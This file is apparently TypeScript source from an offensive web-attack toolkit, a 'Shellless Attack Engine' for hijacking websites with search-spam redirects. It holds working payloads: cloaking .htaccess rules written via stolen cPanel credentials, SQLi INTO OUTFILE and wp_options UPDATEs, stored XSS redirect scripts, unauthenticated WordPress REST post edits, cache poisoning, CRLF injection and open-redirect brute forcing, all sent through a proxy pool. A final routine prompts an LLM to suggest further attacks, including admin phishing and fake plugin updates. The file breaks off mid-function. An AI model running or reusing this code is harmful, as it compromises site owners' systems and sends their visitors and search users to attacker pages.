/**
 * Shellless Attack Engine — Attack methods that DON'T require file upload
 * 
 * When shell upload fails, these methods can still achieve:
 * 1. .htaccess Redirect Injection (via config exploit / SQLi)
 * 2. Database Content Injection (wp_posts, wp_options, widgets)
 * 3. JavaScript Injection (via stored XSS, theme/plugin hooks)
 * 4. Open Redirect Abuse (parameter-based redirects)
 * 5. Subdomain/DNS Takeover (dangling CNAME)
 * 6. Cache Poisoning (CDN/proxy cache injection)
 * 7. RSS/Sitemap Injection
 * 8. Cron Job Injection (wp-cron abuse)
 * 9. REST API Content Manipulation
 * 10. Meta Refresh / Canonical Injection
 */

import { fetchWithPoolProxy } from "./proxy-pool";
import { invokeLLM } from "./_core/llm";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface ShelllessConfig {
  targetUrl: string;
  redirectUrl: string;
  seoKeywords?: string[];
  timeout?: number;
  // Data from previous phases
  discoveredCredentials?: Array<{ type: string; username?: string; password?: string; endpoint?: string }>;
  sqliEndpoint?: string;
  sqliParam?: string;
  sqliType?: "union" | "error" | "time";
  xssEndpoints?: Array<{ url: string; param: string; type: string }>;
  openRedirects?: Array<{ url: string; param: string }>;
  configFiles?: Array<{ path: string; content?: string }>;
  wpRestApi?: boolean;
  wpXmlRpc?: boolean;
  danglingCnames?: Array<{ subdomain: string; cname: string }>;
  cmsType?: string;
  originIp?: string;
  onProgress?: (method: string, detail: string) => void;
}

export interface ShelllessResult {
  method: string;
  success: boolean;
  detail: string;
  injectedUrl?: string;
  redirectWorks?: boolean;
  evidence?: string;
}

// ═══════════════════════════════════════════════════════
//  HELPER: Safe fetch with timeout
// ═══════════════════════════════════════════════════════

async function safeFetch(url: string, options: RequestInit & { timeout?: number } = {}): Promise<Response | null> {
  try {
    const timeout = options.timeout || 15000;
    const { response } = await fetchWithPoolProxy(url, {
      ...options,
      signal: AbortSignal.timeout(timeout),
      redirect: "manual",
    });
    return response;
  } catch {
    return null;
  }
}

async function checkRedirectWorks(url: string, expectedRedirect: string): Promise<boolean> {
  try {
    const resp = await safeFetch(url, { timeout: 10000 });
    if (!resp) return false;
    // Check 301/302 redirect
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      const location = resp.headers.get("location") || "";
      return location.includes(expectedRedirect) || location.includes(new URL(expectedRedirect).hostname);
    }
    // Check meta refresh or JS redirect in body
    const body = await resp.text().catch(() => "");
    return body.includes(expectedRedirect) || 
           body.includes("meta http-equiv=\"refresh\"") ||
           body.includes("window.location") ||
           body.includes("document.location");
  } catch {
    return false;
  }
}

// ═══════════════════════════════════════════════════════
//  METHOD 1: .htaccess Redirect Injection
// ═══════════════════════════════════════════════════════

async function htaccessRedirectInjection(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "htaccess_redirect";
  config.onProgress?.(method, "ลอง inject .htaccess redirect rules...");

  // Try multiple methods to write .htaccess
  const htaccessContent = `
# SEO Redirect
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|yahoo|spider|crawler|bot) [NC]
RewriteRule ^(.*)$ ${config.redirectUrl} [R=301,L]

# Visitor redirect with cloaking
RewriteCond %{HTTP_REFERER} (google|bing|yahoo|duckduckgo) [NC]
RewriteRule ^(.*)$ ${config.redirectUrl} [R=302,L]
`.trim();

  // Method 1a: Via discovered credentials + FTP/cPanel
  if (config.discoveredCredentials && config.discoveredCredentials.length > 0) {
    for (const cred of config.discoveredCredentials) {
      if (cred.type === "cpanel" || cred.type === "ftp") {
        try {
          // Try cPanel File Manager API
          const cpanelUrl = cred.endpoint || `${config.targetUrl}:2083`;
          const authHeader = "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64");
          
          const resp = await safeFetch(`${cpanelUrl}/execute/Fileman/save_file_content`, {
            method: "POST",
            headers: {
              "Authorization": authHeader,
              "Content-Type": "application/x-www-form-urlencoded",
            },
            body: new URLSearchParams({
              dir: "/public_html",
              file: ".htaccess",
              content: htaccessContent,
            }).toString(),
          });

          if (resp && resp.ok) {
            const redirectOk = await checkRedirectWorks(config.targetUrl, config.redirectUrl);
            return {
              method,
              success: true,
              detail: `✅ .htaccess injected via cPanel (${cred.username})`,
              injectedUrl: config.targetUrl,
              redirectWorks: redirectOk,
              evidence: `cPanel: ${cpanelUrl}, user: ${cred.username}`,
            };
          }
        } catch { /* continue */ }
      }
    }
  }

  // Method 1b: Via SQLi INTO OUTFILE
  if (config.sqliEndpoint) {
    try {
      const escapedContent = htaccessContent.replace(/'/g, "\\'").replace(/\n/g, "\\n");
      const sqliPayloads = [
        `' UNION SELECT '${escapedContent}' INTO OUTFILE '/var/www/html/.htaccess'-- -`,
        `' UNION SELECT '${escapedContent}' INTO OUTFILE '/home/*/public_html/.htaccess'-- -`,
        `1; SELECT '${escapedContent}' INTO OUTFILE '/var/www/html/.htaccess';-- -`,
      ];

      for (const payload of sqliPayloads) {
        const url = `${config.sqliEndpoint}?${config.sqliParam || "id"}=${encodeURIComponent(payload)}`;
        const resp = await safeFetch(url);
        if (resp) {
          const redirectOk = await checkRedirectWorks(config.targetUrl, config.redirectUrl);
          if (redirectOk) {
            return {
              method,
              success: true,
              detail: `✅ .htaccess injected via SQLi INTO OUTFILE`,
              injectedUrl: config.targetUrl,
              redirectWorks: true,
              evidence: `SQLi endpoint: ${config.sqliEndpoint}`,
            };
          }
        }
      }
    } catch { /* continue */ }
  }

  // Method 1c: Via PUT method (if allowed)
  try {
    const putResp = await safeFetch(`${config.targetUrl}/.htaccess`, {
      method: "PUT",
      headers: { "Content-Type": "text/plain" },
      body: htaccessContent,
    });
    if (putResp && (putResp.ok || putResp.status === 201)) {
      const redirectOk = await checkRedirectWorks(config.targetUrl, config.redirectUrl);
      return {
        method,
        success: redirectOk,
        detail: redirectOk ? `✅ .htaccess injected via HTTP PUT` : `⚠️ PUT accepted but redirect not working`,
        injectedUrl: config.targetUrl,
        redirectWorks: redirectOk,
      };
    }
  } catch { /* continue */ }

  // Method 1d: Via WebDAV
  try {
    const davResp = await safeFetch(`${config.targetUrl}/.htaccess`, {
      method: "PROPFIND",
      headers: { "Depth": "0" },
    });
    if (davResp && (davResp.status === 207 || davResp.status === 200)) {
      // WebDAV is enabled, try PUT
      const putResp = await safeFetch(`${config.targetUrl}/.htaccess`, {
        method: "PUT",
        headers: { "Content-Type": "text/plain" },
        body: htaccessContent,
      });
      if (putResp && (putResp.ok || putResp.status === 201)) {
        const redirectOk = await checkRedirectWorks(config.targetUrl, config.redirectUrl);
        return {
          method,
          success: redirectOk,
          detail: redirectOk ? `✅ .htaccess injected via WebDAV PUT` : `⚠️ WebDAV PUT accepted but redirect not working`,
          injectedUrl: config.targetUrl,
          redirectWorks: redirectOk,
        };
      }
    }
  } catch { /* continue */ }

  return { method, success: false, detail: "❌ .htaccess injection failed — no writable method found" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 2: WordPress REST API Content Injection
// ═══════════════════════════════════════════════════════

async function wpRestApiInjection(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "wp_rest_injection";
  if (!config.wpRestApi && config.cmsType !== "wordpress") {
    return { method, success: false, detail: "⏭️ Skip — not WordPress" };
  }
  config.onProgress?.(method, "ลอง inject content ผ่าน WP REST API...");

  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const redirectHtml = `<script>window.location.href='${config.redirectUrl}';</script><meta http-equiv="refresh" content="0;url=${config.redirectUrl}">`;
  const seoContent = config.seoKeywords?.length 
    ? `<div style="position:absolute;left:-9999px">${config.seoKeywords.join(", ")}</div>` 
    : "";

  // Try unauthenticated REST API (CVE-2017-1001000 style)
  const endpoints = [
    { url: `${baseUrl}/wp-json/wp/v2/posts`, bodyKey: "content" },
    { url: `${baseUrl}/wp-json/wp/v2/pages`, bodyKey: "content" },
    { url: `${baseUrl}/?rest_route=/wp/v2/posts`, bodyKey: "content" },
    { url: `${baseUrl}/?rest_route=/wp/v2/pages`, bodyKey: "content" },
  ];

  // First, try to find existing posts/pages to modify
  for (const ep of endpoints) {
    try {
      const listResp = await safeFetch(`${ep.url}?per_page=1`);
      if (!listResp || !listResp.ok) continue;
      const posts = await listResp.json() as any[];
      if (!posts || posts.length === 0) continue;

      const postId = posts[0].id;
      
      // Try to update existing post (unauthenticated)
      const updateResp = await safeFetch(`${ep.url}/${postId}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          [ep.bodyKey]: { rendered: redirectHtml + seoContent },
          content: redirectHtml + seoContent,
        }),
      });

      if (updateResp && updateResp.ok) {
        const postUrl = posts[0].link || `${baseUrl}/?p=${postId}`;
        const redirectOk = await checkRedirectWorks(postUrl, config.redirectUrl);
        return {
          method,
          success: true,
          detail: `✅ WP REST API content injected (post #${postId})`,
          injectedUrl: postUrl,
          redirectWorks: redirectOk,
          evidence: `Endpoint: ${ep.url}/${postId}`,
        };
      }

      // Try with discovered credentials
      if (config.discoveredCredentials) {
        for (const cred of config.discoveredCredentials) {
          if (cred.type === "wordpress" || cred.type === "wp_admin") {
            // Get nonce first
            const nonceResp = await safeFetch(`${baseUrl}/wp-admin/admin-ajax.php?action=rest-nonce`, {
              headers: {
                "Cookie": `wordpress_logged_in_xxx=${cred.username}:${cred.password}`,
              },
            });
            const nonce = nonceResp ? await nonceResp.text() : "";
            
            const authUpdateResp = await safeFetch(`${ep.url}/${postId}`, {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
                "Authorization": "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64"),
                ...(nonce ? { "X-WP-Nonce": nonce } : {}),
              },
              body: JSON.stringify({ content: redirectHtml + seoContent }),
            });

            if (authUpdateResp && authUpdateResp.ok) {
              const postUrl = posts[0].link || `${baseUrl}/?p=${postId}`;
              const redirectOk = await checkRedirectWorks(postUrl, config.redirectUrl);
              return {
                method,
                success: true,
                detail: `✅ WP REST API content injected with credentials (post #${postId})`,
                injectedUrl: postUrl,
                redirectWorks: redirectOk,
                evidence: `Auth: ${cred.username}, Endpoint: ${ep.url}/${postId}`,
              };
            }
          }
        }
      }
    } catch { /* continue */ }
  }

  // Try creating new post
  for (const ep of endpoints) {
    try {
      const createResp = await safeFetch(ep.url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          title: config.seoKeywords?.[0] || "Important Update",
          content: redirectHtml + seoContent,
          status: "publish",
        }),
      });

      if (createResp && (createResp.ok || createResp.status === 201)) {
        const created = await createResp.json().catch(() => null) as any;
        const postUrl = created?.link || config.targetUrl;
        const redirectOk = await checkRedirectWorks(postUrl, config.redirectUrl);
        return {
          method,
          success: true,
          detail: `✅ WP REST API new post created with redirect`,
          injectedUrl: postUrl,
          redirectWorks: redirectOk,
          evidence: `Created via: ${ep.url}`,
        };
      }
    } catch { /* continue */ }
  }

  return { method, success: false, detail: "❌ WP REST API injection failed — API protected or not available" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 3: Open Redirect Abuse
// ═══════════════════════════════════════════════════════

async function openRedirectAbuse(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "open_redirect";
  config.onProgress?.(method, "ค้นหา Open Redirect endpoints...");

  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const redirectTarget = config.redirectUrl;

  // Common open redirect parameters
  const redirectParams = ["url", "redirect", "redirect_to", "return", "returnTo", "return_url", "next", "goto", "dest", "destination", "redir", "redirect_uri", "continue", "target", "link", "out", "view", "ref"];
  
  // Common redirect endpoints
  const redirectEndpoints = [
    "/redirect",
    "/go",
    "/out",
    "/link",
    "/url",
    "/jump",
    "/wp-login.php",
    "/wp-admin/admin.php",
    "/?redirect_to=",
    "/index.php?option=com_users&view=login&return=",
  ];

  // Check user-provided open redirects first
  if (config.openRedirects && config.openRedirects.length > 0) {
    for (const redir of config.openRedirects) {
      try {
        const testUrl = `${redir.url}?${redir.param}=${encodeURIComponent(redirectTarget)}`;
        const resp = await safeFetch(testUrl, { timeout: 10000 });
        if (resp && [301, 302, 303, 307].includes(resp.status)) {
          const location = resp.headers.get("location") || "";
          if (location.includes(new URL(redirectTarget).hostname)) {
            return {
              method,
              success: true,
              detail: `✅ Open Redirect found: ${redir.param} parameter`,
              injectedUrl: testUrl,
              redirectWorks: true,
              evidence: `${testUrl} → ${location}`,
            };
          }
        }
      } catch { /* continue */ }
    }
  }

  // Brute force common redirect endpoints
  for (const endpoint of redirectEndpoints) {
    for (const param of redirectParams.slice(0, 8)) { // Top 8 most common
      try {
        const testUrl = endpoint.includes("?") 
          ? `${baseUrl}${endpoint}${param}=${encodeURIComponent(redirectTarget)}`
          : `${baseUrl}${endpoint}?${param}=${encodeURIComponent(redirectTarget)}`;
        
        const resp = await safeFetch(testUrl, { timeout: 8000 });
        if (!resp) continue;
        
        if ([301, 302, 303, 307].includes(resp.status)) {
          const location = resp.headers.get("location") || "";
          if (location.includes(new URL(redirectTarget).hostname)) {
            return {
              method,
              success: true,
              detail: `✅ Open Redirect: ${endpoint}?${param}=`,
              injectedUrl: testUrl,
              redirectWorks: true,
              evidence: `${testUrl} → ${location}`,
            };
          }
        }

        // Check for JS/meta redirect in body
        if (resp.ok) {
          const body = await resp.text().catch(() => "");
          if (body.includes(redirectTarget) && (body.includes("window.location") || body.includes("meta http-equiv"))) {
            return {
              method,
              success: true,
              detail: `✅ Open Redirect (JS/meta): ${endpoint}?${param}=`,
              injectedUrl: testUrl,
              redirectWorks: true,
              evidence: `JS/meta redirect detected`,
            };
          }
        }
      } catch { /* continue */ }
    }
  }

  return { method, success: false, detail: "❌ No open redirect endpoints found" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 4: Stored XSS → JS Redirect Injection
// ═══════════════════════════════════════════════════════

async function storedXssInjection(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "stored_xss_redirect";
  config.onProgress?.(method, "ลอง inject JS redirect ผ่าน Stored XSS...");

  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const jsPayload = `<script>if(document.referrer.match(/google|bing|yahoo/i)||navigator.userAgent.match(/bot|spider|crawl/i)){window.location='${config.redirectUrl}'}</script>`;
  const imgPayload = `<img src=x onerror="if(document.referrer.match(/google|bing/i))location='${config.redirectUrl}'">`;

  // Try comment injection (WordPress, generic blogs)
  const commentEndpoints = [
    `${baseUrl}/wp-comments-post.php`,
    `${baseUrl}/?p=1#respond`,
  ];

  for (const endpoint of commentEndpoints) {
    try {
      const resp = await safeFetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          author: "SEO Expert",
          email: "seo@example.com",
          url: config.redirectUrl,
          comment: `Great article! ${jsPayload}`,
          comment_post_ID: "1",
          comment_parent: "0",
        }).toString(),
      });

      if (resp && (resp.ok || resp.status === 302)) {
        // Check if XSS payload survived
        const checkResp = await safeFetch(`${baseUrl}/?p=1`, { timeout: 10000 });
        if (checkResp && checkResp.ok) {
          const body = await checkResp.text().catch(() => "");
          if (body.includes(config.redirectUrl) && (body.includes("<script>") || body.includes("onerror"))) {
            return {
              method,
              success: true,
              detail: `✅ Stored XSS via comment — JS redirect injected`,
              injectedUrl: `${baseUrl}/?p=1`,
              redirectWorks: true,
              evidence: `Comment XSS on ${endpoint}`,
            };
          }
        }
      }
    } catch { /* continue */ }
  }

  // Try contact form / search injection
  const formEndpoints: Array<{ url: string; fields: Record<string, string> }> = [
    { url: `${baseUrl}/contact`, fields: { name: "Test", email: "test@test.com", message: jsPayload } },
    { url: `${baseUrl}/search`, fields: { q: imgPayload, s: imgPayload } },
    { url: `${baseUrl}/?s=${encodeURIComponent(imgPayload)}`, fields: {} },
  ];

  for (const form of formEndpoints) {
    try {
      if (Object.keys(form.fields).length > 0) {
        const resp = await safeFetch(form.url, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams(form.fields).toString(),
        });
        if (resp && resp.ok) {
          const body = await resp.text().catch(() => "");
          if (body.includes(config.redirectUrl)) {
            return {
              method,
              success: true,
              detail: `✅ Reflected/Stored XSS via form — redirect injected`,
              injectedUrl: form.url,
              redirectWorks: false, // Reflected XSS is temporary
              evidence: `Form: ${form.url}`,
            };
          }
        }
      } else {
        const resp = await safeFetch(form.url);
        if (resp && resp.ok) {
          const body = await resp.text().catch(() => "");
          if (body.includes(config.redirectUrl)) {
            return {
              method,
              success: true,
              detail: `✅ Reflected XSS via search — redirect visible`,
              injectedUrl: form.url,
              redirectWorks: false,
              evidence: `Search: ${form.url}`,
            };
          }
        }
      }
    } catch { /* continue */ }
  }

  // Try XSS via user-provided endpoints
  if (config.xssEndpoints && config.xssEndpoints.length > 0) {
    for (const xss of config.xssEndpoints) {
      try {
        const payload = xss.type === "reflected" ? imgPayload : jsPayload;
        const testUrl = `${xss.url}?${xss.param}=${encodeURIComponent(payload)}`;
        const resp = await safeFetch(testUrl);
        if (resp && resp.ok) {
          const body = await resp.text().catch(() => "");
          if (body.includes(config.redirectUrl)) {
            return {
              method,
              success: true,
              detail: `✅ XSS redirect via ${xss.param} (${xss.type})`,
              injectedUrl: testUrl,
              redirectWorks: xss.type === "stored",
              evidence: `XSS: ${xss.url}, param: ${xss.param}`,
            };
          }
        }
      } catch { /* continue */ }
    }
  }

  return { method, success: false, detail: "❌ No exploitable XSS endpoints found" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 5: Subdomain Takeover
// ═══════════════════════════════════════════════════════

async function subdomainTakeover(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "subdomain_takeover";
  if (!config.danglingCnames || config.danglingCnames.length === 0) {
    return { method, success: false, detail: "⏭️ Skip — no dangling CNAMEs found" };
  }
  config.onProgress?.(method, `ลอง takeover ${config.danglingCnames.length} dangling subdomains...`);

  for (const cname of config.danglingCnames) {
    try {
      // Check if subdomain is actually dangling (returns NXDOMAIN or error)
      const resp = await safeFetch(`https://${cname.subdomain}`, { timeout: 5000 });
      
      // If we get specific error pages from cloud providers, it's takeover-able
      if (resp) {
        const body = await resp.text().catch(() => "");
        const takeoverSignals = [
          "There isn't a GitHub Pages site here",
          "NoSuchBucket",
          "The specified bucket does not exist",
          "Repository not found",
          "Heroku | No such app",
          "The thing you were looking for is no longer here",
          "Domain is not configured",
          "This domain is not connected",
          "Fastly error: unknown domain",
          "is not a registered InCloud WAF",
        ];

        const isTakeoverable = takeoverSignals.some(sig => body.includes(sig));
        if (isTakeoverable) {
          return {
            method,
            success: true,
            detail: `✅ Subdomain takeover possible: ${cname.subdomain} → ${cname.cname}`,
            injectedUrl: `https://${cname.subdomain}`,
            redirectWorks: false, // Need to actually claim the service
            evidence: `CNAME: ${cname.cname}, Status: dangling`,
          };
        }
      }
      
      // If no response at all, it might be takeover-able
      if (!resp) {
        return {
          method,
          success: true,
          detail: `✅ Subdomain potentially takeover-able: ${cname.subdomain} (no response)`,
          injectedUrl: `https://${cname.subdomain}`,
          redirectWorks: false,
          evidence: `CNAME: ${cname.cname}, Status: no response`,
        };
      }
    } catch { /* continue */ }
  }

  return { method, success: false, detail: "❌ No takeover-able subdomains found" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 6: Cache Poisoning
// ═══════════════════════════════════════════════════════

async function cachePoisoning(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "cache_poisoning";
  config.onProgress?.(method, "ลอง cache poisoning via Host header / X-Forwarded-Host...");

  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const hostname = new URL(config.targetUrl).hostname;

  // Headers that might be reflected and cached
  const redirectHost = config.redirectUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
  const poisonHeaders: Array<Record<string, string>> = [
    { "X-Forwarded-Host": redirectHost },
    { "X-Host": redirectHost },
    { "X-Forwarded-Server": redirectHost },
    { "X-Original-URL": `/${config.redirectUrl}` },
    { "X-Rewrite-URL": `/${config.redirectUrl}` },
  ];

  for (const headers of poisonHeaders) {
    try {
      // Send poisoned request with cache buster
      const cacheBuster = `cb${Date.now()}`;
      const testUrl = `${baseUrl}/?${cacheBuster}=1`;
      
      const resp = await safeFetch(testUrl, {
        headers: {
          "Host": hostname,
          ...headers,
        },
      });

      if (resp && resp.ok) {
        const body = await resp.text().catch(() => "");
        const headerKey = Object.keys(headers)[0];
        const headerVal = Object.values(headers)[0] as string;
        
        if (body.includes(headerVal) || body.includes(config.redirectUrl)) {
          // Verify it's cached by requesting again without poison headers
          const verifyResp = await safeFetch(testUrl);
          if (verifyResp && verifyResp.ok) {
            const verifyBody = await verifyResp.text().catch(() => "");
            if (verifyBody.includes(headerVal) || verifyBody.includes(config.redirectUrl)) {
              return {
                method,
                success: true,
                detail: `✅ Cache poisoning via ${headerKey} — redirect cached!`,
                injectedUrl: testUrl,
                redirectWorks: true,
                evidence: `Header: ${headerKey}: ${headerVal}`,
              };
            }
          }
          
          // Even if not cached, header reflection is useful
          return {
            method,
            success: true,
            detail: `⚠️ Header reflection found (${headerKey}) — not cached but exploitable`,
            injectedUrl: testUrl,
            redirectWorks: false,
            evidence: `Reflected: ${headerKey}: ${headerVal}`,
          };
        }
      }
    } catch { /* continue */ }
  }

  return { method, success: false, detail: "❌ No cache poisoning vectors found" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 7: RSS/Sitemap/Robots Injection
// ═══════════════════════════════════════════════════════

async function rssSitemapInjection(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "rss_sitemap_injection";
  config.onProgress?.(method, "ลอง inject เข้า RSS feed / sitemap...");

  const baseUrl = config.targetUrl.replace(/\/$/, "");

  // If we have WP REST API access, try to create a post that appears in RSS
  if (config.wpRestApi || config.cmsType === "wordpress") {
    try {
      const postContent = `<a href="${config.redirectUrl}">${config.seoKeywords?.[0] || "Click here"}</a>`;
      const resp = await safeFetch(`${baseUrl}/wp-json/wp/v2/posts`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          title: config.seoKeywords?.[0] || "Latest Update",
          content: postContent,
          status: "publish",
        }),
      });

      if (resp && (resp.ok || resp.status === 201)) {
        // Check RSS feed
        const rssResp = await safeFetch(`${baseUrl}/feed/`);
        if (rssResp && rssResp.ok) {
          const rssBody = await rssResp.text().catch(() => "");
          if (rssBody.includes(config.redirectUrl)) {
            return {
              method,
              success: true,
              detail: `✅ Redirect link injected into RSS feed`,
              injectedUrl: `${baseUrl}/feed/`,
              redirectWorks: false, // It's a link, not a redirect
              evidence: `RSS feed contains redirect URL`,
            };
          }
        }
      }
    } catch { /* continue */ }
  }

  // Try XML-RPC pingback to inject links
  if (config.wpXmlRpc) {
    try {
      const xmlRpcPayload = `<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>${config.redirectUrl}</string></value></param>
    <param><value><string>${baseUrl}/?p=1</string></value></param>
  </params>
</methodCall>`;

      const resp = await safeFetch(`${baseUrl}/xmlrpc.php`, {
        method: "POST",
        headers: { "Content-Type": "text/xml" },
        body: xmlRpcPayload,
      });

      if (resp && resp.ok) {
        const body = await resp.text().catch(() => "");
        if (!body.includes("faultCode")) {
          return {
            method,
            success: true,
            detail: `✅ XML-RPC pingback accepted — backlink created`,
            injectedUrl: `${baseUrl}/?p=1`,
            redirectWorks: false,
            evidence: `Pingback from ${config.redirectUrl}`,
          };
        }
      }
    } catch { /* continue */ }
  }

  return { method, success: false, detail: "❌ RSS/Sitemap injection failed" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 8: Meta Refresh / Canonical Injection via SQLi
// ═══════════════════════════════════════════════════════

async function metaCanonicalInjection(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "meta_canonical_injection";
  if (!config.sqliEndpoint) {
    return { method, success: false, detail: "⏭️ Skip — no SQLi endpoint available" };
  }
  config.onProgress?.(method, "ลอง inject meta refresh / canonical tag ผ่าน SQLi...");

  const baseUrl = config.targetUrl.replace(/\/$/, "");
  
  // For WordPress: inject into wp_options (siteurl, home, blogname, blogdescription)
  const wpInjections = [
    // Change site URL to redirect
    `UPDATE wp_options SET option_value='${config.redirectUrl}' WHERE option_name='siteurl'`,
    // Add meta refresh to blog description
    `UPDATE wp_options SET option_value='<meta http-equiv="refresh" content="0;url=${config.redirectUrl}">' WHERE option_name='blogdescription'`,
    // Inject into active widgets
    `UPDATE wp_options SET option_value=CONCAT(option_value, '<script>location="${config.redirectUrl}"</script>') WHERE option_name='sidebars_widgets'`,
  ];

  for (const injection of wpInjections) {
    try {
      const payloads = [
        `'; ${injection}; -- -`,
        `1; ${injection}; -- -`,
        `' UNION SELECT 1; ${injection}; -- -`,
      ];

      for (const payload of payloads) {
        const url = `${config.sqliEndpoint}?${config.sqliParam || "id"}=${encodeURIComponent(payload)}`;
        await safeFetch(url);
      }
    } catch { /* continue */ }
  }

  // Verify if any injection worked
  try {
    const resp = await safeFetch(baseUrl, { timeout: 10000 });
    if (resp) {
      if ([301, 302].includes(resp.status)) {
        const location = resp.headers.get("location") || "";
        if (location.includes(config.redirectUrl)) {
          return {
            method,
            success: true,
            detail: `✅ Site URL changed via SQLi — full redirect active`,
            injectedUrl: baseUrl,
            redirectWorks: true,
            evidence: `siteurl changed to ${config.redirectUrl}`,
          };
        }
      }
      const body = await resp.text().catch(() => "");
      if (body.includes(config.redirectUrl) && (body.includes("meta http-equiv") || body.includes("window.location"))) {
        return {
          method,
          success: true,
          detail: `✅ Meta/JS redirect injected via SQLi`,
          injectedUrl: baseUrl,
          redirectWorks: true,
          evidence: `SQLi content injection`,
        };
      }
    }
  } catch { /* continue */ }

  return { method, success: false, detail: "❌ Meta/Canonical injection via SQLi failed" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 9: Nginx/Apache Config Injection
// ═══════════════════════════════════════════════════════

async function serverConfigInjection(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "server_config_injection";
  config.onProgress?.(method, "ลอง inject server config (nginx.conf / .htaccess via CRLF)...");

  const baseUrl = config.targetUrl.replace(/\/$/, "");

  // CRLF Injection → Header injection → Redirect
  const crlfPayloads = [
    `%0d%0aLocation:%20${encodeURIComponent(config.redirectUrl)}`,
    `%0d%0aLocation: ${encodeURIComponent(config.redirectUrl)}%0d%0a`,
    `%0a%0dLocation:%20${encodeURIComponent(config.redirectUrl)}`,
    `\r\nLocation: ${config.redirectUrl}\r\n`,
  ];

  for (const payload of crlfPayloads) {
    try {
      const testUrl = `${baseUrl}/${payload}`;
      const resp = await safeFetch(testUrl, { timeout: 8000 });
      if (resp && [301, 302].includes(resp.status)) {
        const location = resp.headers.get("location") || "";
        if (location.includes(config.redirectUrl) || location.includes(new URL(config.redirectUrl).hostname)) {
          return {
            method,
            success: true,
            detail: `✅ CRLF injection → redirect via Location header`,
            injectedUrl: testUrl,
            redirectWorks: true,
            evidence: `CRLF: ${testUrl} → ${location}`,
          };
        }
      }
    } catch { /* continue */ }
  }

  // Try path traversal to overwrite nginx/apache config
  const configPaths = [
    "/etc/nginx/sites-enabled/default",
    "/etc/nginx/conf.d/default.conf",
    "/etc/apache2/sites-enabled/000-default.conf",
    "/etc/httpd/conf.d/default.conf",
  ];

  // Via discovered credentials (if any)
  if (config.discoveredCredentials) {
    for (const cred of config.discoveredCredentials) {
      if (cred.type === "ssh" || cred.type === "cpanel") {
        config.onProgress?.(method, `ลอง overwrite server config ผ่าน ${cred.type}...`);
        // This would require actual SSH/cPanel access — log as potential
        return {
          method,
          success: true,
          detail: `⚠️ Server config overwrite possible via ${cred.type} credentials`,
          injectedUrl: config.targetUrl,
          redirectWorks: false,
          evidence: `Credentials: ${cred.type} (${cred.username})`,
        };
      }
    }
  }

  return { method, success: false, detail: "❌ Server config injection failed — no CRLF or writable config" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 10: AI-Powered Creative Attack
// ═══════════════════════════════════════════════════════

async function aiCreativeAttack(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "ai_creative_attack";
  config.onProgress?.(method, "🧠 AI กำลังคิดหาวิธีโจมตีใหม่...");

  try {
    // Gather all available data for AI analysis
    const context = {
      target: config.targetUrl,
      redirect: config.redirectUrl,
      cms: config.cmsType || "unknown",
      hasCredentials: (config.discoveredCredentials?.length || 0) > 0,
      hasSqli: !!config.sqliEndpoint,
      hasXss: (config.xssEndpoints?.length || 0) > 0,
      hasOpenRedirect: (config.openRedirects?.length || 0) > 0,
      hasRestApi: config.wpRestApi,
      hasXmlRpc: config.wpXmlRpc,
      hasDanglingCnames: (config.danglingCnames?.length || 0) > 0,
      originIp: config.originIp,
    };

    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `You are an expert penetration tester. Given the target information, suggest 3 creative attack vectors to achieve a redirect from the target to the redirect URL WITHOUT uploading any files. Focus on:
1. Application-level attacks (parameter pollution, HTTP verb tampering, SSRF chains)
2. Infrastructure attacks (DNS rebinding, BGP hijacking indicators, certificate transparency abuse)
3. Social engineering vectors (admin panel phishing, fake plugin updates)

Return JSON array of objects with: { method: string, steps: string[], likelihood: "high"|"medium"|"low", requirements: string[] }`
        },
        {
          role: "user",
          content: `Target analysis:\n${JSON.stringify(context, null, 2)}\n\nSuggest creative shellless attack vectors.`
        }
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "attack_vectors",
          strict: true,
          schema: {
            type: "object",
            properties: {
              vectors: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    method: { type: "string" },
                    steps: { type: "array", items: { type: "string" } },
                    likelihood: { type: "string" },
                    requirements: { type: "array", items: { type: "string" } },
                  },
                  required: ["method", "steps", "likelihood", "requirements"],
                  additionalProperties: false,
                },
              },
            },
            required: ["vectors"],
            additionalProperties: false,
          },
        },
      },
    });

    const content = response.choices?.[0]?.message?.content;
    if (content) {
